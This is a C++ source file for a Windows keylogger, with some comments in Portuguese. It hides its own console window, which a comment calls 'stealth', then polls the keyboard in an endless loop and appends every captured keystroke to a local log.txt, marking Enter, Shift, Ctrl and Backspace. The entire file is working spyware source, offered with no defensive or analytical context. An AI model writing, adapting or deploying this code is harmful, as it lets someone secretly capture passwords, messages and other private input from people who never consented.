#include <cstdio>
#include <cstdlib>
#include <windows.h>

void salvar(int character, char* nomeArquivo);

int main ( void )
{
	char a;

	HWND stealth; /*creating stealth (window is not visible)*/
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
    while(true)
    {
        for(a=8;a<=190;a++)
            if(GetAsyncKeyState(a) == -32767) // captura as teclas !!
                salvar(a,"log.txt");
    }

    return 0;
}

void salvar(int character, char* nomeArquivo){

    FILE *file;
    file = fopen(nomeArquivo, "a+");

    if((character>=39)&&(character<=64))
    {
        fputc(character,file);
        fclose(file);
    }
    else if((character>64)&&(character<91))
    {
        character+=32;
        fputc(character,file);
        fclose(file);
    }
    else
    {
        switch(character)
        {
        case VK_SPACE:
            fputc(' ',file);
            fclose(file);
            break;
        case VK_SHIFT:
            fputs("\r\n[sHIFT]\r\n",file);
            fclose(file);
            break;
        case VK_RETURN:
            fputs("\r\n[ENTER]\r\n",file);
            fclose(file);
            break;
        case VK_BACK:
            fputs("\r\n[bACKSPACE]\r\n",file);
            fclose(file);
            break;
        case VK_TAB:
            fputs("\r\n[TAB]\r\n",file);
            fclose(file);
            break;
        case VK_CONTROL:
            fputs("\r\n[CTRL]\r\n",file);
            fclose(file);
            break;
        case VK_DELETE:
            fputs("\r\n[DEL]\r\n",file);
            fclose(file);
            break;
        case VK_OEM_1:
            fputs("\r\n[;:]\r\n",file);
            fclose(file);
            break;
        case VK_OEM_2:
            fputs("\r\n[/?]\r\n",file);
            fclose(file);
            break;
        case VK_OEM_3:
            fputs("\r\n[`~]\r\n",file);
            fclose(file);
            break;
        case VK_OEM_4:
            fputs("\r\n[ [{ ]\r\n",file);
            fclose(file);
            break;
        case VK_OEM_5:
            fputs("\r\n[\\|]\r\n",file);
            fclose(file);
            break;
        case VK_OEM_6:
            fputs("\r\n[ ]} ]\r\n",file);
            fclose(file);
            break;
        case VK_OEM_7:
            fputs("\r\n['\"]\r\n",file);
            fclose(file);
            break;
        case 187:
            fputc('+',file);
            fclose(file);
            break;
        case 188:
            fputc(',',file);
            fclose(file);
            break;
        case 189:
            fputc('-',file);
            fclose(file);
            break;
        case 190:
            fputc('.',file);
            fclose(file);
            break;
        case VK_NUMPAD0:
            fputc('0',file);
            fclose(file);
            break;
        case VK_NUMPAD1:
            fputc('1',file);
            fclose(file);
            break;
        case VK_NUMPAD2:
            fputc('2',file);
            fclose(file);
            break;
        case VK_NUMPAD3:
            fputc('3',file);
            fclose(file);
            break;
        case VK_NUMPAD4:
            fputc('4',file);
            fclose(file);
            break;
        case VK_NUMPAD5:
            fputc('5',file);
            fclose(file);
            break;
        case VK_NUMPAD6:
            fputc('6',file);
            fclose(file);
            break;
        case VK_NUMPAD7:
            fputc('7',file);
            fclose(file);
            break;
        case VK_NUMPAD8:
            fputc('8',file);
            fclose(file);
            break;
        case VK_NUMPAD9:
            fputc('9',file);
            fclose(file);
            break;
        case VK_CAPITAL:
            fputs("\r\n[CAPS LOCK]\r\n",file);
            fclose(file);
            break;
        default:
            fclose(file);
            break;
        }
    }
}
